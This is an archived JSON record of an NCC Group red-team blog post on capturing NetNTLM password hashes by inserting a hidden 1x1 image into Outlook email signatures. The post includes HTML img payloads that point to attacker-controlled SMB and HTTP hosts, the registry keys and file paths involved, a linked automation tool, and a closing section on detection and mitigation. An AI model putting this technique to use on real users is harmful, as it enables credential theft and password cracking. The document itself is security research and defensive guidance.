{
    "id": "c452431e-6050-4fee-9eef-f815443cbeb9",
    "created_at": "2023-01-12T15:04:40.181876Z",
    "updated_at": "2025-03-27T02:08:40.520677Z",
    "deleted_at": null,
    "sha1_hash": "57035db3690f8c3477d8eab9587ca27bc7bfa98f",
    "title": "2021-01-15 - Sign over Your Hashes â€“ Stealing NetNTLM Hashes via Outlook Signatures",
    "authors": "",
    "file_creation_date": "2022-05-27T22:15:53Z",
    "file_modification_date": "2022-05-27T22:15:53Z",
    "file_size": 1624555,
    "plain_text": "# Sign over Your Hashes â€“ Stealing NetNTLM Hashes via Outlook Signatures\n\n**[research.nccgroup.com/2021/01/15/sign-over-your-hashes-stealing-netntlm-hashes-via-outlook-signatures/](https://research.nccgroup.com/2021/01/15/sign-over-your-hashes-stealing-netntlm-hashes-via-outlook-signatures/)**\n\nJanuary 15, 2021\n\nIn your emails, getting your hashes\n\nCapturing NetNTLM hashes from network communications is nothing new; a quick Google\nfor â€˜Capture NTLM Hashesâ€™ throws up blog posts discussing the various ways to force SMB\ncommunications to an attacker and the numerous existing tools to capture the authentication\nattempt and extract the password hash. Sniffing SMB traffic requires elevated permissions\nthat typically arenâ€™t available when you first get command and control on your target and\nbeing a â€˜yesâ€™ person for NetBIOS queries can be a little noisy. This blog post will discuss the\nconcept of Windows â€˜Trust Zonesâ€™, how email signatures are configured in Outlook and how\nthe combination of the two can result in the capture of hashes. The focus will be on achieving\nthis in a red team scenario, which means ticking the following boxes:\n\n\n-----\n\nCan be performed without GUI access\nMinimal impact to the user experience\nRepeatable and automated\nEasily reversible (Any changes to files/settings put back to the original state)\n\nWindows Trust Zones\n\nIn order to capture hashes, software on the target system must be forced to attempt a type\nauthentication to the attacker using the currently authenticated account. As well as SMB,\nother protocols can also support authentication with the userâ€™s NetNTLM hash over the\nnetwork:\n\nHTTP\nPOP3\nSMTP\n\nOn previous engagements internal phishing emails for both credential capture, and malicious\ndocuments for establishing command and control have been highly successful, however this\nlevel of overtness can lead to detection, particularly when close colleagues are targeted.\nCapturing and cracking hashes requires less user interaction and therefore has a lower\ndetection rate. A typical internal phishing email targeting SMB would contain HTML\ncontent similar to the following:\n```\n<html>\n<body>\n<img width=1 height=1 src=\"file://10.10.10.10/images/logo.png\">\n</body>\n</html>\n\n```\nWhen this does not point to a valid resource, accessible over SMB by the target, Outlook\ninforms the user that itâ€™s struggling to retrieve the data but the connection attempt is enough\nto capture the target userâ€™s password hash if (and itâ€™s a big if) administrative permissions\nhave been gained on a machine accessible by the target.\n\n\n-----\n\nSo using SMB links doesn t satisfy the requirements for stealth, or the ability to act without\nalready elevated permissions. This doesnâ€™t mean we canâ€™t use <img> tags to capture hashes\nthough, it just needs to be over HTTP. HTTP NetNTLM authentication can be requested by\nthe server, to which the web browser (or other web-enabled client) will cause the web\nbrowser to engage in a challenge/response communication that, if captured can be subjected\nto offline cracking to obtain the userâ€™s plain text password â€“ the image below shows the\nauthentication flow at a high level:\n\nIn order to prevent nefarious servers on the internet from simply requesting this type of\nauthentication, Microsoft introduced the concept of trust zones. In order of least restrictive to\nmost restrictive, these zones are:\n\nMy Computer\nLocal Intranet Zone\nTrusted sites Zone\nInternet Zone\nRestricted Sites Zone\n\nSo if youâ€™re trying to authenticate to something on the local intranet then the browser will\nhappily send your password hash, allowing single sign-on but if evil.com asks for the hash, it\nwill be classed as â€˜Internet Zoneâ€™ and therefore wonâ€™t receive it.\n\nGet in the Zone\n\nSo how does Windows know whether the server requesting the authentication is in the Local\nIntranet Zone? As well as being able to add specific sites to a zone, Internet Options also\nhas some default patterns that will cause a resource to be classed as Intranet:\n\n\n-----\n\nThis results in the following outcomes when running through the various different ways of\nrequesting the same HTTP resource:\n\n\n**Type** **URL** **Zone**\n**Classification**\n\n\n**Outcome**\n\n\nIP\nAddress\n\n\n[http://192.168.10.10/index.html](http://192.168.10.10/index.html) Internet User is prompted\nfor a username\nand password\n\n\nFQDN* [http://webserver.targetorg.local/index.html](http://webserver.targetorg.local/index.html) Internet[J1] User is prompted\nfor a username\nand password\n\n\n-----\n\nNetBIOS\nName\n\n\n[http://webserver/index.html](http://webserver/index.html) Intranet NTLM\nAuthentication is\nattempted with\nthe currently\nauthenticated\nuserâ€™s credentials\n\n\n_*Though this is the default setting, many organisations will add the FQDN of the internal_\n_domain to the Intranet zone._\n\nSo if we can force a HTTP request using a NetBIOS name from a domain joined machine to\na web server that captures authentication attempts, then we end up with a password hash to\ncrack. This is all very familiar to anyone who has used Responder, or Inveigh although\nperhaps SMB is the more popular protocol, combined with NetBIOS name spoofing. The\nbenefits of HTTP over SMB are:\n\nA HTTP server can listen on any port â€“ important for low integrity command and control\nDoesnâ€™t require elevated privileges to sniff traffic on Windows; itâ€™s a running service, not\ncapturing communications to an existing service as Inveigh does with SMB.\n\nThese benefits are huge and ripe for abuse on most red team engagements, particularly\ngiven on most engagements:\n\nInitial access is on a low privileged end user device (so we can still use this)\nMost organisations still have a relatively flat network (all hosts can communicate with\neach other â€“ even over the VPN!)\nHost based firewalls are often off or configured very permissively when in the â€˜Domainâ€™\nprofile\nThere are a number of ways to elicit HTTP traffic to a destination\n\nOutlook Security\n\nWhen operating through a command and control channel, sending an email using the\ntargetâ€™s account becomes more complex. Thereâ€™s always the option of stealing some\nOffice365 cookies, or browser pivoting through the beacon but attempts to use a web based\ninterface but itâ€™s always nice to be able to operate without the requirement for a GUI.\nAttempting to use Microsoft.Office.Interop.Outlook in C# can result in a sudden and rather\nworrying prompt for the user:\n\n\n-----\n\nBy default, the decision whether to display this prompt is bizarrely made by checking whether\nthe current anti-virus software is out-of-date. If itâ€™s not then the prompt is not shown; an\nextract from the Outlook Programmatic Access documentation is shown below:\n\nThe Programmatic Access security settings in the Trust Center provide the following\noptions:\n\n**Setting** **Meaning**\n\n\nWarn me about\nsuspicious activity when\nmy antivirus software is\ninactive or out-of-date\n(recommended)\n\nAlways warn me about\nsuspicious activity\n\nNever warn me about\nsuspicious activity (not\nrecommended)\n\n\nThis is the default setting in Outlook. Suspicious activity refers\nto an untrusted program that is trying to access Outlook.\n\nThis is the most secure setting and youâ€™ll always be prompted\nto make a trust decision when a program attempts to access\nOutlook.\n\nThis is the least secure setting. This means that with a few preflight checks, sending out internal phishing emails can be fairly\ntrivial and the default Trust Centre settings mean that any\nimages included within HTML content will be automatically\ndownloaded.\n\n\n-----\n\nSo this means that the email content would now become:\n```\n<html>\n<body>\n<img width=1 height=1 src=\"http://target/images/logo.png\">\n</body>\n</html>\n\n```\nGiven GUI access to a target, it is possible to insert the HTML content using Outlook,\nalthough this seems to require the addition of an alternative â€œAttach Fileâ€ menu item to give\nthe required option. This can be achieved by modifying the ribbon to include the duplicate\nâ€œAttach Fileâ€ as shown below:\n\n\n-----\n\nWhen composing a new email message, the newly added â€œAttach Fileâ€ menu offers the\noption to insert a HTML file as text, which results in the content being included and rendered\nin the email body.\n\n\n-----\n\nBut what if we donâ€™t have GUI access, and if the user has security settings that prevent code\nfrom interacting with Outlook Interop?\n\nSign Me Up!\n\nEmail Signatures can be defined from within Outlook via the Options > Mail > Signatures\nmenu, as shown below:\n\n\n-----\n\nCreating a signature results in the content being used to generate three files types in the\nuserâ€™s AppData folder that correspond to the various email formats; plain text, Rich Text and\nHTML:\n\nThese files are then referenced in different places within the registry depending on whether\nthe signature has been defined by the end user, or pushed via policy\n\n**Action** **Registry Key** **Values**\n\n\n-----\n\nUser\nDefined\nSignature\n\nPolicy\nDefined\nSignature\n\n\nComputer\\HKEY_USERS\\<user\nSID>\\SOFTWARE\\Microsoft\\Office\\<office\nversion>\\Outlook\\Profiles\\Outlook\\<PROFILE\nID>\\00000002\n\nComputer\\HKEY_USERS\\<user\nsid>\\SOFTWARE\\Microsoft\\Office\\<office\nversion>\\Common\\MailSettings\n\n\nNew Signature\nReply-Forward\nSignature\n\nNewSignature\nReplySignature\n\n\nSo with some quick logic we can see whether a user has signatures set, or not. If itâ€™s not set,\nwe can set one on the userâ€™s behalf through creation of the relevant files within the\nsignatures folder (C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Signature\\MySignature.htm),\nor modify an existing signature if one is already set.\n\nSimply adding a 1Ã—1 pixel image to the signature will achieve the desired results.\n\nTo automate the process of modifying the signature and starting a corresponding listener, a\ntool was written in C#, borrowing code from the Seatbelt and Inveigh projects. The tool\nfeatures are:\n\nQueries the firewall for suitable ports to listen on (Uses some seatbelt code)\nCross references HttpQueryServiceConfiguration for any usable URL ACLs\nStarts TCP/HTTP server for hash capture (Uses Inveigh code)\nSignature Detection (to modify the appropriate registry settings and signatures)\nModification of Signature\nOption to send mail to a specific AD group (e.g. domain admins)\nOption to create encrypted logs on disk\nCleanup (Reverts changes in signature settings and existing signature)\n\n*Tool sold as seen/ â€œWorks on my boxâ€ â€“\n\n[Published on github at: https://github.com/nccgroup/nccfsas/blob/main/Tools/Sigwhatever](https://github.com/nccgroup/nccfsas/blob/main/Tools/Sigwhatever)\n\nThe use of the tool (except potentially use of the send mail feature) should not impact the\nuser experience or make any visible changes (just donâ€™t look really closely for the 1x1px\nimage ðŸ˜‰)\n\nThere are some potential downsides for this attack which you should be aware of prior to\nuse:\n\nExternal recipients would also receive the tracking image in the signature, revealing an\ninternal hostname.\nIf targeted users access the emails at a later date â€“ this will still trigger a request to be\nsent, so this could be picked up by another attacker at a later date (in the highly\nunlikely event that the same host is compromised, and an attacker decides to attempt\nhash capture on the same port)\n\n\n-----\n\nExpediting the attack by sending unsolicited emails with the modified signatures may\nbe suspicious.\n\nDetection and Prevention\n\nThere are number of mitigations which would prevent this attack, all of which are generally\nsensible hardening steps to hosts which we advise\n\nNetwork Segregation â€“ As always, internal network segregation can help to reduce the\neffectiveness of this kind of technique. Allowing only essential communication between\nend user devices would make the service listening for hashes inaccessible.\nHost based firewalls â€“ Turn them on, and prevent additional services from listening\nTurn off auto-download of images, or default to plain text email (this is default for\nemails from outside the organisation, but HTML is displayed for email sent within the\nsame organisation)\nMonitor for changes to the relevant registry keys from processes other than\nOutlook.exe\n\n**Plain Text Email**\nDefaulting to rendering emails in plain text for both received communications and\ncomposition would prevent Outlook from rendering the HTML in the signature. This can be\nachieved on a single machine via the following options:\n\n**Composition:**\nOutlook Options -> Mail -> Compose messages in this format\n\n**Received Email:**\nOutlook Options -> Trust Center -> Email Security -> Read all standard mail in plain text\n\nThis can also be set via Group Policy with the correct admin templates installed:\n\n**Composition:**\nUser Configuration -> Policies -> Administrative Templates -> Microsoft Outlook <VERSION>\n-> Outlook Options -> Mail Format -> Internet Formatting -> Message Format -> Set\nmessage format\n\n**Received Email:**\nUser Configuration -> Policies -> Administrative Templates -> Microsoft Outlook <VERSION>\n-> Outlook Options -> Preferences -> E-mail Options -> Read Email as Plaint Text\n\nThis obviously has an impact on the formatting and readability of email content but can be\noverridden by the end user on a per-email basis.\n\nCredits: David Cash, Julian Storr, Richard Warren\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-15 - Sign over Your Hashes â€“ Stealing NetNTLM Hashes via Outlook Signatures.pdf"
    ],
    "report_names": [
        "2021-01-15 - Sign over Your Hashes â€“ Stealing NetNTLM Hashes via Outlook Signatures.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535880,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653689753,
    "ts_modification_date": 1653689753,
    "files": {
        "pdf": "https://archive.orkl.eu/57035db3690f8c3477d8eab9587ca27bc7bfa98f.pdf",
        "text": "https://archive.orkl.eu/57035db3690f8c3477d8eab9587ca27bc7bfa98f.txt",
        "img": "https://archive.orkl.eu/57035db3690f8c3477d8eab9587ca27bc7bfa98f.jpg"
    }
}